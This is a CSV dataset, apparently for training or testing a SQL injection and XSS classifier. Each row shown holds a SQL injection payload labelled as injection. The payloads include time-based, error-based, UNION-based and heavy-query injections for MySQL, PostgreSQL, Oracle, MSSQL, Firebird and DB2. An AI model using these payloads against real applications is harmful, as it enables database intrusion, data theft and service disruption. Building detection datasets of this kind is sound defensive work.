index,payload,sqli,xss
4211,"1%""  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  ""%""  =  """,1,0
4212,"1'   )    )     )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  'isyg'  =  'isyg",1,0
4213,"1"" where 2989  =  2989 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,0
4214,"-5024%"" or make_set  (  3321  =  7355,7355  )   and ""%""  =  """,1,0
4215,"1""   )    )     )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (     (  ""suxh""  =  ""suxh",1,0
4216,select   (  case when   (  2593  =  3592  )   then 2593 else 2593*  (  select 2593 from information_schema.character_sets  )   end  )  #,1,0
4217,"1 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  # couj",1,0
4218,"1%' and make_set  (  8403  =  8403,8899  )   and '%'  =  '",1,0
4219,"1   )    )     )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,0
4220,"1%'   )    )     )   union all select null,null,null,null,null,null,null--",1,0
4221,"1'||  (  select 'hdpi' where 5620  =  5620 and make_set  (  8403  =  8403,8899   )    )   ||'",1,0
4222,"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   ",1,0
4223,"-7381'   )    )    or elt  (  5882  =  5919,5919  )   and    (    (   'nzri'  =  'nzri",1,0
4224,"1'  )   where 5883  =  5883 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,0
4225,"1'  )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1,0
4226,"-8256""   )    )     )   or 6872  =  6872 and    (    (     (  ""lrtu""  =  ""lrtu",1,0
4227,"1' where 3339  =  3339 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",1,0
4228,select   (  case when   (  2056  =  1917  )   then 2056 else 1/  (  select 0  )   end  )  --,1,0
4229,"1%""   )    )    or sleep  (  5  )  #",1,0
4230," end and    (    (     (  ""revx""  =  ""revx",1,0
4231,"1%' union all select null,null,null,null--",1,0
4232,"1%' or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1,0
4233,1%'   )    )    rlike sleep  (  5  )   and    (    (   '%'  =  ',1,0
4234,"1""   )    )    as zval where 2255  =  2255 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",1,0
4235,"1  )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  ",1,0
4236,"1'   )    )    as bsvk where 5985  =  5985 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --",1,0
4237,select case when 8867  =  7630 then 1 else null end--,1,0
4238,-4331  )   as inpx where 9804  =  9804 union all select 9804#,1,0
4239,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (     (  'egnv' like 'egnv",1,0
4240,"1   )    )    and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   4450  =  4450",1,0
4241,"-4596"" union all select 5761#",1,0
4242,"1"" where 5353  =  5353 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",1,0
4243,"-6419 union all select 7008,7008,7008,7008,7008--",1,0
4244,"-9180"" or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1,0
4245,-8828   )    )    as ospo where 2141  =  2141 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,1,0
4246,"-3361 where 1335  =  1335 or elt  (  5891  =  5092,5092  )  --",1,0
4247,1'+  (  select 'mdxt' where 2733  =  2733 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1,0
4248,"-5587%'  )   or elt  (  1032  =  1032,3623  )   and   (  '%'  =  '",1,0
4249,"-6431' or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and 'ixix' like 'ixix",1,0
4250,"1%""   )    )    union all select null,null,null,null,null,null,null,null--",1,0
4251,"-7553%"" or 3571  =  2886",1,0
4252,1'||  (  select 'ydvg' from dual where 7108  =  7108,1,0
4253,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'gtcb'  =  'gtcb",1,0
4254,1'||  (  select 'adoe' from dual where 7662  =  7662,1,0
4255,"-2453""  )   union all select 4520,4520,4520,4520,4520,4520,4520,4520,4520,4520--",1,0
4256,1'+  (  select pagd where 2484  =  2484,1,0
4257,"1'   )    )    as lizu where 7691  =  7691 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,0
4258,"1 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ",1,0
4259,"1'+  (  select hspl where 4530  =  4530 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,0
4260,"1',  (  select   (  case when   (  8382  =  8382  )   then 1 else 1/  (  select 0  )   end   )    )   ",1,0
4261,1   )    )    as cwyb where 3633  =  3633,1,0
4262,"-9860%"" union all select 6996,6996,6996,6996,6996,6996#",1,0
4263,"1""   )    )    as pxdp where 4575  =  4575 and elt  (  8258  =  7218,7218  )  --",1,0
4264,"1  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",1,0
4265,"1""  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  ""jfgk"" like ""jfgk",1,0
4266,"-5073""  )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  ""kbab"" like ""kbab",1,0
4267,select   (  case when   (  4774  =  1535  )   then 4774 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1,0
4268,1'   )    )    as hxxm where 3792  =  3792 and sleep  (  5  )  #,1,0
4269,1' in boolean mode  )   order by 1#,1,0
4270,"1  )   or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,0
4271,"1%""  )   and 8626  =  3626#",1,0
4272,"iif  (  5214  =  7412,1,1/0  )  ",1,0
4273,"1'   )    )    and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (   'nuil' like 'nuil",1,0
4274,"1'   )    )     )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,0
4275,1'||  (  select 'rhcv' where 6228  =  6228,1,0
4276,select pg_sleep  (  5  )   and    (    (   4382  =  4382,1,0
4277,"1'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  'oacz'  =  'oacz",1,0
4278,"-6951"" union all select 2518,2518,2518,2518,2518,2518,2518,2518--",1,0
4279,"1'+  (  select mems where 5091  =  5091 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )     )  +'",1,0
4280,"1 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  # cqqs",1,0
4281,"1'||  (  select 'ltqo' where 9080  =  9080 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )     )  ||'",1,0
4282,"1'+  (  select 'otqy' where 2754  =  2754 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   +'",1,0
4283,"1   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   3626  =  3626",1,0
4284,"1' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and 'qcsi'  =  'qcsi",1,0
4285,"1   )    )    and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   5776  =  5776",1,0
4286,"1   )    )     )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  9401  =  9401",1,0
4287,1 rlike sleep  (  5  )  -- muhp,1,0
4288,1 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  -- saxs,1,0
4289,1  )   as ratg where 3033  =  3033 union all select null--,1,0
4290,-7404' where 1536  =  1536 order by 1#,1,0
4291,"1'  )   union all select null,null,null,null,null,null,null,null,null,null#",1,0
4292,1  )   as cinw where 3732  =  3732 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1,0
4293,"1 union all select null,null,null--",1,0
4294,1'  )   as rhvm where 1420  =  1420,1,0
4295,"1'  )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  'edcm' like 'edcm",1,0
4296,-2756' where 6156  =  6156 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,1,0
4297,1'  )   union all select null#,1,0
4298,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )     )  +'",1,0
4299,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",1,0
4300,"1%""   )    )     )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  ""%""  =  """,1,0
4301,"-8129'   )    )     )   union all select 4531,4531,4531#",1,0
4302,"1""  )   union all select null,null,null,null,null,null,null,null,null#",1,0
4303,"1'  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  ",1,0
4304,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  3770  =  3770",1,0
4305,1'  )   as gogu where 4338  =  4338 union all select null#,1,0
4306,"-6096'  )   where 1316  =  1316 union all select 1316,1316,1316,1316,1316,1316,1316,1316#",1,0
4307,"1,  (  select   (  case when   (  9644  =  9644  )   then dbms_pipe.receive_message  (  chr  (  75  )  ||chr  (  78  )  ||chr  (  104  )  ||chr  (  98  )  ,5  )   else 1/  (  select 0 from dual  )   end  )   from dual  )  ",1,0
4308,"1""   )    )    and make_set  (  8403  =  8403,8899  )   and    (    (   ""ieuj"" like ""ieuj",1,0
4309,1 where 2384  =  2384 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1,0
4310,"1%'  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  '%'  =  '",1,0
4311,"1""  )   union all select null,null,null,null,null,null,null,null,null--",1,0
4312,"1  )   as mnyy where 4409  =  4409 union all select null,null,null,null--",1,0
4313,"1"" where 9725  =  9725",1,0
4314,"-7580'   )    )    as mmqt where 3468  =  3468 union all select 3468,3468,3468,3468,3468,3468#",1,0
4315,"1%"" union all select null,null,null,null,null,null--",1,0
4316,"1   )    )     )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,0
4317,"1""  )   as ipxg where 4031  =  4031 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",1,0
4318,"1'  )   as jysm where 8961  =  8961 union all select null,null#",1,0
4319,1'   )    )    as xcvg where 1157  =  1157 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --,1,0
4320,"1""  )   and sleep  (  5  )   and   (  ""ytof""  =  ""ytof",1,0
4321,"1""  )   as pobe where 1704  =  1704",1,0
4322,"1"" where 9332  =  9332 union all select null,null,null,null,null,null,null,null,null--",1,0
4323,-2432'   )    )    or   (  8459  =  8459  )  *4906 and    (    (   'ejhp'  =  'ejhp,1,0
4324,-8641%' order by 1--,1,0
4325,"-3249'   )    )     )   union all select 6309,6309#",1,0
4326,1'   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (   'yqbo'  =  'yqbo,1,0
4327,1'  )   as nexa where 6740  =  6740,1,0
4328,"1""  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  ""rvub"" like ""rvub",1,0
4329,"-7741'  )   where 8271  =  8271 union all select 8271,8271,8271,8271,8271,8271,8271#",1,0
4330,"-5009  )   where 8463  =  8463 union all select 8463,8463,8463,8463,8463,8463--",1,0
4331,"1%""  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  ""%""  =  """,1,0
4332,1'+  (  select shec where 3589  =  3589 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )     )  +',1,0
4333,"-4305  )   as ldrt where 2567  =  2567 union all select 2567,2567,2567,2567,2567,2567,2567#",1,0
4334,-4322'   )    )    as magw where 1627  =  1627 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --,1,0
4335,"1' and make_set  (  8403  =  8403,8899  )   and 'niux'  =  'niux",1,0
4336,end and   (  4610  =  4610,1,0
4337,"1   )    )    union all select null,null,null--",1,0
4338,1'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and   (  'brob'  =  'brob,1,0
4339,"1'||  (  select 'xjcg' from dual where 5815  =  5815 union all select null,null,null#",1,0
4340,"1'   )    )    and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   'fowu' like 'fowu",1,0
4341,1'  )   where 5280  =  5280 and 4595  =  4595#,1,0
4342,"1%"" and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,0
4343,1  )   where 3565  =  3565 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --,1,0
4344, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  'kerg' like 'kerg,1,0
4345,1'  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  ) ,1,0
4346,"1"" where 9760  =  9760 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",1,0
4347,"1'||  (  select 'vqag' from dual where 8154  =  8154 union all select null,null,null,null,null,null,null,null,null,null--",1,0
4348,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""squx"" like ""squx",1,0
4349,"1""   )    )     )   and 4967  =  8866 and    (    (     (  ""jzyn"" like ""jzyn",1,0
4350,"1""  )   as oztl where 6655  =  6655 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,0
4351,if  (  7899  =  7899  )   select 7899 else drop function zbbp--,1,0
4352,"1""   )    )     (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and    (    (   ""uwdz""  =  ""uwdz",1,0
4353,"1'||  (  select 'ativ' from dual where 4746  =  4746 union all select null,null,null,null#",1,0
4354,"1,iif  (  6625  =  6625,1,1/0  )  ",1,0
4355,"-9922'   )    )    union all select 2193,2193,2193--",1,0
4356,"1"" and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  ",1,0
4357,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3",1,0
4358,"select count  (  *  )   from generate_series  (  1,5000000   )    )   ||'",1,0
4359,1'   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   'uqfs'  =  'uqfs,1,0
4360,"-9959""  )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  ""vcwc""  =  ""vcwc",1,0
4361,"select * from generate_series  (  7610,7610,case when   (  7610  =  9416  )   then 1 else 0 end  )   limit 1--",1,0
4362,"1 where 4477  =  4477 union all select null,null,null,null,null,null,null,null,null,null--",1,0
4363,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""yzjl"" like ""yzjl",1,0
4364,"1'   )    )    and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   'mymg'  =  'mymg",1,0
4365,"1 where 2751  =  2751 union all select null,null,null,null--",1,0
4366,"1%""   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  ""%""  =  """,1,0
4367,1  )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  3530  =  3530,1,0
4368,"1   )    )     )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,0
4369,1'||  (  select 'znba' where 8323  =  8323,1,0
4370,waitfor delay '0:0:5' and    (    (     (  8981  =  8981,1,0
4371,"-6948""   )    )    as ojjl where 1300  =  1300 or 6872  =  6872--",1,0
4372,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (   'bhlx' like 'bhlx",1,0
4373,"1""   )    )    as ndbk where 5042  =  5042 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",1,0
4374,"-1917""  )   or 8571  =  8571--",1,0
4375,"1"" and elt  (  2373  =  5817,5817  )   and ""rsdt""  =  ""rsdt",1,0
4376,1'   )    )     )   and   (  8982  =  8027  )  *8027 and    (    (     (  'qkrv'  =  'qkrv,1,0
4377,select   (  case when   (  2350  =  8682  )   then 2350 else 1/  (  select 0  )   end  )  --,1,0
4378,select pg_sleep  (  5  )   and   (  '%'  =  ',1,0
4379,"1'  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  'yznd' like 'yznd",1,0
4380,"1'||  (  select 'eayf' where 5431  =  5431 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null   )    )   ||'",1,0
4381,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4# ljph",1,0
4382,-3436  )   or 9281  =  3172,1,0
4383,"-1907""   )    )    or 2782  =  3591",1,0
4384,"1%"" and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,0
4385,"iif  (  2869  =  9448,1,1/0  )  ",1,0
4386,"1%'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  '%'  =  '",1,0
4387,"1'+  (  select 'kqnj' where 9483  =  9483 or elt  (  5873  =  5873,sleep  (  5   )    )   #",1,0
4388,1%'   )    )     )   and 4595  =  4595#,1,0
4389,"1' or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'aytf' like 'aytf",1,0
4390,"1' and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and 'tqvy' like 'tqvy",1,0
4391,"-1830""   )    )    as bptv where 4805  =  4805 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --",1,0
4392,"-4012""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""ccfn""  =  ""ccfn",1,0
4393,1' where 2913  =  2913 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  --,1,0
4394,1'   )    )    as dqby where 9256  =  9256,1,0
4395,1'||  (  select 'vvpn' from dual where 7011  =  7011 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   ||',1,0
4396,"-4047'||  (  select 'rqta' from dual where 9743  =  9743 union all select 9743,9743,9743#",1,0
4397,"1' where 5251  =  5251 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1,0
4398,-7548 or 2850  =  9666,1,0
4399,"-2743 union all select 6757,6757,6757,6757,6757,6757--",1,0
4400,"1'   )    )    and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   'lshk' like 'lshk",1,0
4401,-8911%' or 9323  =  9323#,1,0
4402,"1   )    )    and make_set  (  8554  =  3286,3286  )   and    (    (   7385  =  7385",1,0
4403,select   (  case when   (  6276  =  6276  )   then 6276 else 6276*  (  select 6276 from information_schema.character_sets  )   end  )  #,1,0
4404,"1""   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  ""jywy"" like ""jywy",1,0
4405,"-6200' where 9150  =  9150 union all select 9150,9150,9150,9150,9150,9150,9150#",1,0
4406,"1  )   as bgvd where 1753  =  1753 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,0
4407,"1""  )   as kdvb where 2651  =  2651 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --",1,0
4408,1   )    )    as xyuy where 6894  =  6894,1,0
4409,"1%""  )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,0
4410,select pg_sleep  (  5  )   and    (    (     (  'qslr'  =  'qslr,1,0
